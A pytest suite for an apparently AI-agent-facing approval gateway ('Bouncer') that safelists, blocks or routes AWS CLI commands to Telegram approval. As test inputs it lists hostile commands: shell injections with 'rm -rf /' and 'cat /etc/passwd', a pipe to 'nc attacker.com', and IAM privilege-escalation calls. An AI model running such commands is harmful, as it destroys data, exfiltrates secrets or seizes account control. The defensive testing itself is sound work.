"""
Bouncer v2.0.0 測試
包含 MCP JSON-RPC 測試 + 原有 REST API 測試
"""

import json
import sys
import os
import time
import pytest
from unittest.mock import patch, MagicMock
from decimal import Decimal

# Moto for AWS mocking
from moto import mock_aws
import boto3


# ============================================================================
# Fixtures
# ============================================================================

@pytest.fixture
def mock_dynamodb():
    """建立 mock DynamoDB 表"""
    with mock_aws():
        dynamodb = boto3.resource('dynamodb', region_name='us-east-1')
        table = dynamodb.create_table(
            TableName='clawdbot-approval-requests',
            KeySchema=[{'AttributeName': 'request_id', 'KeyType': 'HASH'}],
            AttributeDefinitions=[{'AttributeName': 'request_id', 'AttributeType': 'S'}],
            BillingMode='PAY_PER_REQUEST'
        )
        table.wait_until_exists()
        yield dynamodb


@pytest.fixture
def app_module(mock_dynamodb):
    """載入 app 模組並注入 mock"""
    # 設定環境變數
    os.environ['AWS_DEFAULT_REGION'] = 'us-east-1'
    os.environ['TABLE_NAME'] = 'clawdbot-approval-requests'
    os.environ['REQUEST_SECRET'] = 'test-secret'
    os.environ['TELEGRAM_BOT_TOKEN'] = 'test-token'
    os.environ['APPROVED_CHAT_ID'] = '999999999'
    os.environ['MCP_MAX_WAIT'] = '5'  # 測試用短時間
    
    # 重新載入模組（包括新模組）
    for mod in ['app', 'telegram', 'paging', 'trust', 'commands',
                'src.app', 'src.telegram', 'src.paging', 'src.trust', 'src.commands']:
        if mod in sys.modules:
            del sys.modules[mod]
    
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
    import app
    
    # 注入 mock table
    app.table = mock_dynamodb.Table('clawdbot-approval-requests')
    app.dynamodb = mock_dynamodb
    
    yield app
    
    sys.path.pop(0)


# ============================================================================
# MCP Tests
# ============================================================================

class TestMCPInitialize:
    """MCP initialize 方法測試"""
    
    def test_initialize_success(self, app_module):
        """測試 MCP initialize"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 1,
                'method': 'initialize',
                'params': {}
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        body = json.loads(result['body'])
        assert body['jsonrpc'] == '2.0'
        assert body['id'] == 1
        assert 'result' in body
        assert body['result']['serverInfo']['name'] == 'bouncer'
        assert body['result']['protocolVersion'] == '2024-11-05'


class TestMCPToolsList:
    """MCP tools/list 方法測試"""
    
    def test_tools_list(self, app_module):
        """測試列出所有工具"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 2,
                'method': 'tools/list',
                'params': {}
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'result' in body
        tools = body['result']['tools']
        tool_names = [t['name'] for t in tools]
        
        assert 'bouncer_execute' in tool_names
        assert 'bouncer_status' in tool_names
        assert 'bouncer_list_safelist' in tool_names


class TestMCPExecuteSafelist:
    """MCP bouncer_execute SAFELIST 測試"""
    
    @patch('subprocess.run')
    def test_execute_safelist_command(self, mock_run, app_module):
        """測試自動批准的命令"""
        mock_run.return_value = MagicMock(
            stdout='{"Reservations": []}',
            stderr='',
            returncode=0
        )
        
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 3,
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws ec2 describe-instances'
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'result' in body
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'auto_approved'
        assert '{"Reservations": []}' in content['result']


class TestMCPExecuteBlocked:
    """MCP bouncer_execute BLOCKED 測試"""
    
    def test_execute_blocked_command(self, app_module):
        """測試被封鎖的命令"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 4,
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws iam create-user --user-name hacker'
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'result' in body
        assert body['result']['isError'] == True
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'blocked'


class TestMCPExecuteApproval:
    """MCP bouncer_execute APPROVAL 測試"""
    
    @patch('app.send_telegram_message')
    def test_execute_needs_approval_async(self, mock_telegram, app_module):
        """測試需要審批的命令（預設異步，立即返回 pending_approval）"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 5,
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws ec2 start-instances --instance-ids i-123',
                        'reason': 'Test start'
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        # 預設異步：立即返回 pending_approval
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'pending_approval'
        assert 'request_id' in content
        assert mock_telegram.called
    
    @patch('app.send_telegram_message')
    @patch('subprocess.run')
    def test_execute_approved(self, mock_run, mock_telegram, app_module):
        """測試審批通過的命令"""
        mock_run.return_value = MagicMock(
            stdout='Instance started',
            stderr='',
            returncode=0
        )
        
        # 先建立 pending 請求
        request_id = 'test123'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws ec2 start-instances --instance-ids i-123',
            'status': 'approved',
            'result': 'Instance started',
            'approver': '999999999'
        })
        
        # 查詢狀態
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 6,
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_status',
                    'arguments': {
                        'request_id': request_id
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'approved'
        assert content['result'] == 'Instance started'


class TestMCPListSafelist:
    """MCP bouncer_list_safelist 測試"""
    
    def test_list_safelist(self, app_module):
        """測試列出 safelist"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 7,
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_list_safelist',
                    'arguments': {}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        content = json.loads(body['result']['content'][0]['text'])
        assert 'safelist_prefixes' in content
        assert 'blocked_patterns' in content
        assert 'aws ec2 describe-' in content['safelist_prefixes']


class TestMCPErrors:
    """MCP 錯誤處理測試"""
    
    def test_invalid_secret(self, app_module):
        """測試無效的 secret"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'wrong-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 1,
                'method': 'initialize'
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'error' in body
        assert body['error']['code'] == -32600
    
    def test_invalid_jsonrpc_version(self, app_module):
        """測試無效的 jsonrpc 版本"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '1.0',
                'id': 1,
                'method': 'initialize'
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'error' in body
        assert 'jsonrpc must be "2.0"' in body['error']['message']
    
    def test_unknown_method(self, app_module):
        """測試未知方法"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 1,
                'method': 'unknown_method'
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'error' in body
        assert body['error']['code'] == -32601
    
    def test_unknown_tool(self, app_module):
        """測試未知工具"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 1,
                'method': 'tools/call',
                'params': {
                    'name': 'unknown_tool',
                    'arguments': {}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'error' in body
        assert body['error']['code'] == -32602


# ============================================================================
# REST API Tests（向後兼容）
# ============================================================================

class TestRESTSafelist:
    """REST API SAFELIST 測試"""
    
    @patch('subprocess.run')
    def test_safelist_auto_approved(self, mock_run, app_module):
        """測試 REST API 自動批准"""
        mock_run.return_value = MagicMock(
            stdout='{"Account": "123456"}',
            stderr='',
            returncode=0
        )
        
        event = {
            'rawPath': '/',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'command': 'aws sts get-caller-identity'
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        body = json.loads(result['body'])
        assert body['status'] == 'auto_approved'


class TestRESTBlocked:
    """REST API BLOCKED 測試"""
    
    def test_blocked_command(self, app_module):
        """測試 REST API 封鎖命令"""
        event = {
            'rawPath': '/',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'command': 'aws iam delete-user --user-name admin'
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 403
        
        body = json.loads(result['body'])
        assert body['status'] == 'blocked'


class TestRESTApproval:
    """REST API APPROVAL 測試"""
    
    @patch('app.send_telegram_message')
    def test_approval_pending(self, mock_telegram, app_module):
        """測試 REST API 待審批（非等待模式）"""
        event = {
            'rawPath': '/',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'command': 'aws ec2 stop-instances --instance-ids i-123',
                'wait': False
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 202
        
        body = json.loads(result['body'])
        assert body['status'] == 'pending_approval'
        assert 'request_id' in body
        assert mock_telegram.called


# ============================================================================
# Telegram Webhook Tests
# ============================================================================

class TestTelegramWebhook:
    """Telegram Webhook 測試"""
    
    @patch('app.update_message')
    @patch('app.answer_callback')
    @patch('subprocess.run')
    def test_approve_callback(self, mock_run, mock_answer, mock_update, app_module):
        """測試審批通過 callback"""
        mock_run.return_value = MagicMock(
            stdout='Done',
            stderr='',
            returncode=0
        )
        
        # 建立 pending 請求
        request_id = 'webhook_test'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws ec2 start-instances --instance-ids i-123',
            'status': 'pending_approval',
            'created_at': int(time.time())
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb123',
                    'from': {'id': 999999999},
                    'data': f'approve:{request_id}',
                    'message': {'message_id': 999}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        # 驗證狀態更新
        item = app_module.table.get_item(Key={'request_id': request_id})['Item']
        assert item['status'] == 'approved'
        assert 'result' in item
    
    @patch('app.update_message')
    @patch('app.answer_callback')
    def test_deny_callback(self, mock_answer, mock_update, app_module):
        """測試拒絕 callback"""
        request_id = 'deny_test'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws ec2 terminate-instances --instance-ids i-123',
            'status': 'pending_approval',
            'created_at': int(time.time())
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb456',
                    'from': {'id': 999999999},
                    'data': f'deny:{request_id}',
                    'message': {'message_id': 888}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        item = app_module.table.get_item(Key={'request_id': request_id})['Item']
        assert item['status'] == 'denied'
    
    @patch('app.answer_callback')
    def test_unauthorized_user(self, mock_answer, app_module):
        """測試未授權用戶"""
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
                    'id': 'cb789',
                    'from': {'id': 999999},  # 未授權
                    'data': 'approve:test123',
                    'message': {'message_id': 777}
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 403


# ============================================================================
# Command Classification Tests
# ============================================================================

class TestCommandClassification:
    """命令分類測試"""
    
    def test_is_blocked(self, app_module):
        """測試 BLOCKED 分類"""
        assert app_module.is_blocked('aws iam create-user --user-name test')
        assert app_module.is_blocked('aws iam delete-role --role-name admin')
        assert app_module.is_blocked('aws sts assume-role --role-arn xxx')
        assert app_module.is_blocked('aws ec2 describe-instances; rm -rf /')
        assert app_module.is_blocked('aws s3 ls | cat /etc/passwd')
        assert app_module.is_blocked('aws lambda invoke $(whoami)')
    
    def test_is_auto_approve(self, app_module):
        """測試 SAFELIST 分類"""
        assert app_module.is_auto_approve('aws ec2 describe-instances')
        assert app_module.is_auto_approve('aws s3 ls')
        assert app_module.is_auto_approve('aws sts get-caller-identity')
        assert app_module.is_auto_approve('aws rds describe-db-instances')
        assert app_module.is_auto_approve('aws logs filter-log-events --log-group xxx')
    
    def test_approval_required(self, app_module):
        """測試需要審批的命令"""
        # 這些不在 blocked 也不在 safelist
        assert not app_module.is_blocked('aws ec2 start-instances --instance-ids i-123')
        assert not app_module.is_auto_approve('aws ec2 start-instances --instance-ids i-123')
        
        assert not app_module.is_blocked('aws s3 rm s3://bucket/file')
        assert not app_module.is_auto_approve('aws s3 rm s3://bucket/file')


# ============================================================================
# Security Tests
# ============================================================================

class TestSecurity:
    """安全測試"""

    def test_shell_injection_not_executed(self, app_module):
        """測試 shell injection 不會被執行（execute_command 層面）"""
        # 注意：is_blocked 只檢查命令黑名單
        # shell injection 防護在 execute_command 中用 shlex.split
        injections = [
            'aws s3 ls; cat /etc/passwd',
            'aws ec2 describe-instances | nc attacker.com 1234',
            'aws lambda invoke && rm -rf /',
        ]

        for cmd in injections:
            # 這些命令會在 execute_command 執行時被安全處理
            # shlex.split 會把 ; | && 等當作參數而不是 shell 操作符
            pass  # shell injection 防護測試在 test_execute_only_aws_commands
    
    @patch('subprocess.run')
    def test_execute_only_aws_commands(self, mock_run, app_module):
        """測試只能執行 aws 命令"""
        result = app_module.execute_command('ls -la')
        assert '只能執行 aws CLI 命令' in result
        
        result = app_module.execute_command('cat /etc/passwd')
        assert '只能執行 aws CLI 命令' in result


# ============================================================================
# Integration Tests
# ============================================================================

class TestIntegration:
    """整合測試"""
    
    def test_full_mcp_flow_safelist(self, app_module):
        """測試完整 MCP 流程（SAFELIST）"""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = MagicMock(
                stdout='{"UserId": "123", "Account": "456", "Arn": "arn:aws:iam::456:user/test"}',
                stderr='',
                returncode=0
            )
            
            # Initialize
            init_event = {
                'rawPath': '/mcp',
                'headers': {'x-approval-secret': 'test-secret'},
                'body': json.dumps({
                    'jsonrpc': '2.0',
                    'id': 1,
                    'method': 'initialize',
                    'params': {}
                }),
                'requestContext': {'http': {'method': 'POST'}}
            }
            result = app_module.lambda_handler(init_event, None)
            assert result['statusCode'] == 200
            
            # Execute
            exec_event = {
                'rawPath': '/mcp',
                'headers': {'x-approval-secret': 'test-secret'},
                'body': json.dumps({
                    'jsonrpc': '2.0',
                    'id': 2,
                    'method': 'tools/call',
                    'params': {
                        'name': 'bouncer_execute',
                        'arguments': {
                            'command': 'aws sts get-caller-identity'
                        }
                    }
                }),
                'requestContext': {'http': {'method': 'POST'}}
            }
            result = app_module.lambda_handler(exec_event, None)
            body = json.loads(result['body'])
            
            content = json.loads(body['result']['content'][0]['text'])
            assert content['status'] == 'auto_approved'
            assert 'UserId' in content['result']


# ============================================================================
# Status Query Tests
# ============================================================================

class TestStatusQuery:
    """狀態查詢測試"""
    
    def test_status_query_found(self, app_module):
        """測試查詢存在的請求"""
        request_id = 'status_test'
        app_module.table.put_item(Item={
            'request_id': request_id,
            'command': 'aws ec2 describe-instances',
            'status': 'approved',
            'result': 'OK'
        })
        
        event = {
            'rawPath': f'/status/{request_id}',
            'headers': {'x-approval-secret': 'test-secret'},
            'requestContext': {'http': {'method': 'GET'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
        
        body = json.loads(result['body'])
        assert body['status'] == 'approved'
    
    def test_status_query_not_found(self, app_module):
        """測試查詢不存在的請求"""
        event = {
            'rawPath': '/status/nonexistent',
            'headers': {'x-approval-secret': 'test-secret'},
            'requestContext': {'http': {'method': 'GET'}}
        }
        
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 404


# ============================================================================
# Trust Session 測試
# ============================================================================

class TestTrustSession:
    """Trust Session 測試"""
    
    def test_should_trust_approve_no_session(self, app_module):
        """沒有 Trust Session 時應該返回 False"""
        should_trust, session, reason = app_module.should_trust_approve(
            'aws ec2 describe-instances',
            'test-source',
            '111111111111'
        )
        assert should_trust is False
        assert session is None
    
    def test_trust_excluded_services(self, app_module):
        """高危服務應該被排除"""
        # IAM 命令不應該被信任
        assert app_module.is_trust_excluded('aws iam list-users') is True
        assert app_module.is_trust_excluded('aws sts get-caller-identity') is True
        assert app_module.is_trust_excluded('aws kms list-keys') is True
        
        # 安全命令可以被信任
        assert app_module.is_trust_excluded('aws ec2 describe-instances') is False
        assert app_module.is_trust_excluded('aws s3 ls') is False
    
    def test_trust_excluded_actions(self, app_module):
        """高危操作應該被排除"""
        # 刪除操作
        assert app_module.is_trust_excluded('aws ec2 delete-vpc --vpc-id vpc-123') is True
        assert app_module.is_trust_excluded('aws s3 rm s3://bucket/key') is True
        
        # 終止操作
        assert app_module.is_trust_excluded('aws ec2 terminate-instances --instance-ids i-123') is True
        
        # 停止操作
        assert app_module.is_trust_excluded('aws ec2 stop-instances --instance-ids i-123') is True
    
    def test_trust_excluded_flags(self, app_module):
        """危險旗標應該被排除"""
        # --force
        assert app_module.is_trust_excluded('aws s3 rm s3://bucket --force') is True
        
        # --recursive
        assert app_module.is_trust_excluded('aws s3 rm s3://bucket --recursive') is True
        
        # --skip-final-snapshot
        assert app_module.is_trust_excluded('aws rds delete-db-instance --skip-final-snapshot') is True
        
        # 安全命令
        assert app_module.is_trust_excluded('aws s3 ls s3://bucket') is False


# ============================================================================
# Rate Limiting 測試
# ============================================================================

class TestRateLimiting:
    """Rate Limiting 測試"""
    
    def test_rate_limit_not_exceeded(self, app_module):
        """正常請求不應該觸發 rate limit"""
        # 第一次請求應該通過
        try:
            app_module.check_rate_limit('test-source-1')
        except (app_module.RateLimitExceeded, app_module.PendingLimitExceeded):
            pytest.fail("Rate limit should not be exceeded on first request")

    def test_rate_limit_disabled(self, app_module):
        """停用 rate limit 時應該跳過檢查"""
        with patch('rate_limit.RATE_LIMIT_ENABLED', False):
            # 即使呼叫多次也不應該觸發
            for _ in range(20):
                app_module.check_rate_limit('test-source-2')


# ============================================================================
# Output Paging 測試
# ============================================================================

class TestOutputPaging:
    """Output Paging 測試"""
    
    def test_short_output_not_paged(self, app_module):
        """短輸出不應該分頁"""
        result = app_module.store_paged_output('req-123', 'short output')
        assert result['paged'] is False
        assert result['result'] == 'short output'
    
    def test_long_output_is_paged(self, app_module):
        """長輸出應該分頁"""
        long_output = 'x' * 5000  # 超過 OUTPUT_MAX_INLINE
        result = app_module.store_paged_output('req-456', long_output)
        
        assert result['paged'] is True
        assert result['page'] == 1
        assert result['total_pages'] == 2  # 5000 / 3000 = 2 頁
        assert result['output_length'] == 5000
        assert result['next_page'] == 'req-456:page:2'
        assert len(result['result']) == 3000  # 第一頁
    
    def test_get_paged_output(self, app_module):
        """測試取得分頁輸出"""
        # 先存一個長輸出
        long_output = 'A' * 3000 + 'B' * 3000  # 6000 字元，2 頁
        app_module.store_paged_output('req-789', long_output)
        
        # 取得第 2 頁
        result = app_module.get_paged_output('req-789:page:2')
        
        assert 'error' not in result
        assert result['page'] == 2
        assert result['total_pages'] == 2
        assert result['result'] == 'B' * 3000
        assert result['next_page'] is None  # 最後一頁
    
    def test_get_nonexistent_page(self, app_module):
        """測試取得不存在的分頁"""
        result = app_module.get_paged_output('nonexistent:page:99')
        assert 'error' in result


# ============================================================================
# 命令分類測試（補充）
# ============================================================================

class TestCommandClassification:
    """命令分類補充測試"""
    
    def test_blocked_iam_commands(self, app_module):
        """IAM 危險命令應該被阻擋"""
        blocked_commands = [
            'aws iam delete-user --user-name admin',
            'aws iam create-access-key --user-name admin',
            'aws iam attach-role-policy --role-name Admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess',
            'aws sts assume-role --role-arn arn:aws:iam::123:role/Admin',
        ]
        for cmd in blocked_commands:
            assert app_module.is_blocked(cmd) is True, f"Should block: {cmd}"
    
    def test_dangerous_commands(self, app_module):
        """高危命令應該被標記為 DANGEROUS（需特殊審批，但不是完全禁止）"""
        dangerous_commands = [
            'aws ec2 terminate-instances --instance-ids i-12345',
            'aws rds delete-db-instance --db-instance-identifier prod-db',
            'aws lambda delete-function --function-name important-func',
            'aws cloudformation delete-stack --stack-name prod-stack',
            'aws s3 rb s3://my-bucket',
            'aws s3api delete-bucket --bucket my-bucket',
        ]
        for cmd in dangerous_commands:
            assert app_module.is_dangerous(cmd) is True, f"Should be dangerous: {cmd}"
            # DANGEROUS 命令不應該被完全 block
            assert app_module.is_blocked(cmd) is False, f"Should NOT be blocked: {cmd}"
    
    def test_auto_approve_read_commands(self, app_module):
        """讀取命令應該自動批准"""
        auto_approve_commands = [
            'aws s3 ls',
            'aws ec2 describe-instances',
            'aws lambda list-functions',
            'aws dynamodb scan --table-name test',
            'aws logs get-log-events --log-group-name /aws/lambda/test',
        ]
        for cmd in auto_approve_commands:
            assert app_module.is_auto_approve(cmd) is True, f"Should auto-approve: {cmd}"
    
    def test_needs_approval_write_commands(self, app_module):
        """寫入命令應該需要審批"""
        need_approval_commands = [
            'aws ec2 run-instances --image-id ami-123',
            'aws s3 cp file.txt s3://bucket/',
            'aws lambda invoke --function-name test output.json',
            'aws dynamodb put-item --table-name test --item {}',
        ]
        for cmd in need_approval_commands:
            # 不被阻擋
            assert app_module.is_blocked(cmd) is False, f"Should not block: {cmd}"
            # 也不自動批准
            assert app_module.is_auto_approve(cmd) is False, f"Should not auto-approve: {cmd}"


# ============================================================================
# JSON 參數修復測試
# ============================================================================

class TestJsonParameterFix:
    """測試 shlex.split 破壞 JSON 參數的修復邏輯"""
    
    def test_simple_json_with_quotes(self, app_module):
        """帶引號的簡單 JSON"""
        import shlex
        cmd = '''aws secretsmanager create-secret --name test --generate-secret-string '{"PasswordLength":32}' '''
        args = shlex.split(cmd)
        cli_args = args[1:]  # 移除 'aws'
        
        # 修復後應該保持 JSON 完整
        fixed = app_module.fix_json_args(cmd, cli_args.copy())
        json_idx = fixed.index('--generate-secret-string') + 1
        assert fixed[json_idx] == '{"PasswordLength":32}'
    
    def test_json_without_quotes(self, app_module):
        """無引號的 JSON（shlex 會破壞）"""
        import shlex
        cmd = 'aws secretsmanager create-secret --name test --generate-secret-string {"PasswordLength":32,"ExcludePunctuation":true}'
        args = shlex.split(cmd)
        cli_args = args[1:]
        
        # shlex 會破壞 JSON
        broken_idx = cli_args.index('--generate-secret-string') + 1
        assert ':' not in cli_args[broken_idx] or '"' not in cli_args[broken_idx]
        
        # 修復後應該還原
        fixed = app_module.fix_json_args(cmd, cli_args.copy())
        assert fixed[broken_idx] == '{"PasswordLength":32,"ExcludePunctuation":true}'
    
    def test_nested_json(self, app_module):
        """巢狀 JSON"""
        import shlex
        cmd = '''aws dynamodb put-item --table-name test --item '{"id":{"S":"123"},"data":{"M":{"key":{"S":"val"}}}}' '''
        args = shlex.split(cmd)
        cli_args = args[1:]
        
        fixed = app_module.fix_json_args(cmd, cli_args.copy())
        json_idx = fixed.index('--item') + 1
        assert fixed[json_idx] == '{"id":{"S":"123"},"data":{"M":{"key":{"S":"val"}}}}'
    
    def test_array_parameter(self, app_module):
        """陣列參數"""
        import shlex
        cmd = '''aws ec2 create-tags --resources i-123 --tags '[{"Key":"Name","Value":"Test"}]' '''
        args = shlex.split(cmd)
        cli_args = args[1:]
        
        fixed = app_module.fix_json_args(cmd, cli_args.copy())
        json_idx = fixed.index('--tags') + 1
        assert fixed[json_idx] == '[{"Key":"Name","Value":"Test"}]'
    
    def test_non_json_parameter_unchanged(self, app_module):
        """非 JSON 參數不應該被改變"""
        import shlex
        cmd = 'aws s3 ls s3://my-bucket --recursive'
        args = shlex.split(cmd)
        cli_args = args[1:]
        
        fixed = app_module.fix_json_args(cmd, cli_args.copy())
        assert fixed == cli_args  # 應該完全相同


# ============================================================================
# Accounts 模組測試
# ============================================================================

class TestAccounts:
    """帳號管理模組測試"""
    
    def test_validate_account_id_valid(self, app_module):
        """有效的 12 位帳號 ID"""
        valid, error = app_module.validate_account_id('123456789012')
        assert valid is True
        assert error is None
    
    def test_validate_account_id_empty(self, app_module):
        """空帳號 ID"""
        valid, error = app_module.validate_account_id('')
        assert valid is False
        assert '不能為空' in error
    
    def test_validate_account_id_not_digit(self, app_module):
        """非數字帳號 ID"""
        valid, error = app_module.validate_account_id('abc123456789')
        assert valid is False
        assert '數字' in error
    
    def test_validate_account_id_wrong_length(self, app_module):
        """長度不對的帳號 ID"""
        valid, error = app_module.validate_account_id('12345')
        assert valid is False
        assert '12 位' in error
    
    def test_validate_role_arn_empty(self, app_module):
        """空 Role ARN（允許）"""
        valid, error = app_module.validate_role_arn('')
        assert valid is True
        assert error is None
    
    def test_validate_role_arn_none(self, app_module):
        """None Role ARN（允許）"""
        valid, error = app_module.validate_role_arn(None)
        assert valid is True
        assert error is None
    
    def test_validate_role_arn_valid(self, app_module):
        """有效的 Role ARN"""
        valid, error = app_module.validate_role_arn('arn:aws:iam::123456789012:role/MyRole')
        assert valid is True
        assert error is None
    
    def test_validate_role_arn_invalid_prefix(self, app_module):
        """無效前綴"""
        valid, error = app_module.validate_role_arn('invalid:arn')
        assert valid is False
        assert 'arn:aws:iam' in error
    
    def test_validate_role_arn_missing_role(self, app_module):
        """缺少 :role/"""
        valid, error = app_module.validate_role_arn('arn:aws:iam::123456789012:user/MyUser')
        assert valid is False
        assert ':role/' in error


# ============================================================================
# Trust 模組測試（補充）
# ============================================================================

class TestTrustExcluded:
    """Trust 排除規則測試"""
    
    def test_is_trust_excluded_iam(self, app_module):
        """IAM 命令應被排除"""
        from trust import is_trust_excluded
        assert is_trust_excluded('aws iam create-user --user-name test') is True
    
    def test_is_trust_excluded_kms(self, app_module):
        """KMS 命令應被排除"""
        from trust import is_trust_excluded
        assert is_trust_excluded('aws kms create-key') is True
    
    def test_is_trust_excluded_delete(self, app_module):
        """delete 操作應被排除"""
        from trust import is_trust_excluded
        assert is_trust_excluded('aws s3 rm s3://bucket/key') is True
        assert is_trust_excluded('aws ec2 delete-security-group --group-id sg-123') is True
    
    def test_is_trust_excluded_terminate(self, app_module):
        """terminate 操作應被排除"""
        from trust import is_trust_excluded
        assert is_trust_excluded('aws ec2 terminate-instances --instance-ids i-123') is True
    
    def test_is_trust_excluded_force_flag(self, app_module):
        """--force 旗標應被排除"""
        from trust import is_trust_excluded
        assert is_trust_excluded('aws s3 rb s3://bucket --force') is True
    
    def test_is_trust_excluded_safe_command(self, app_module):
        """安全命令不應被排除"""
        from trust import is_trust_excluded
        assert is_trust_excluded('aws s3 ls') is False
        assert is_trust_excluded('aws ec2 describe-instances') is False


# ============================================================================
# Telegram 模組測試
# ============================================================================

class TestTelegramModule:
    """Telegram 模組測試"""
    
    def test_escape_markdown_special_chars(self, app_module):
        """Markdown 特殊字元跳脫"""
        from telegram import escape_markdown
        assert escape_markdown('*bold*') == '\\*bold\\*'
        assert escape_markdown('_italic_') == '\\_italic\\_'
        assert escape_markdown('`code`') == '\\`code\\`'
        assert escape_markdown('[link') == '\\[link'  # 只跳脫 [
    
    def test_escape_markdown_none(self, app_module):
        """None 輸入應返回 None"""
        from telegram import escape_markdown
        assert escape_markdown(None) is None
    
    def test_escape_markdown_empty(self, app_module):
        """空字串應返回空字串"""
        from telegram import escape_markdown
        assert escape_markdown('') == ''
    
    def test_escape_markdown_no_special(self, app_module):
        """無特殊字元不變"""
        from telegram import escape_markdown
        assert escape_markdown('hello world') == 'hello world'
    
    def test_telegram_requests_parallel_empty(self, app_module):
        """空請求列表"""
        from telegram import _telegram_requests_parallel
        result = _telegram_requests_parallel([])
        assert result == []


# ============================================================================
# Paging 模組測試（補充）
# ============================================================================

class TestPagingModule:
    """Paging 模組測試"""
    
    def test_store_paged_output_short(self, app_module):
        """短輸出不分頁"""
        result = app_module.store_paged_output('test-req-1', 'short output')
        assert result['paged'] is False
        assert result['result'] == 'short output'
    
    def test_store_paged_output_long(self, app_module):
        """長輸出分頁"""
        long_output = 'x' * 5000  # 超過 OUTPUT_MAX_INLINE
        result = app_module.store_paged_output('test-req-2', long_output)
        assert result['paged'] is True
        assert result['page'] == 1
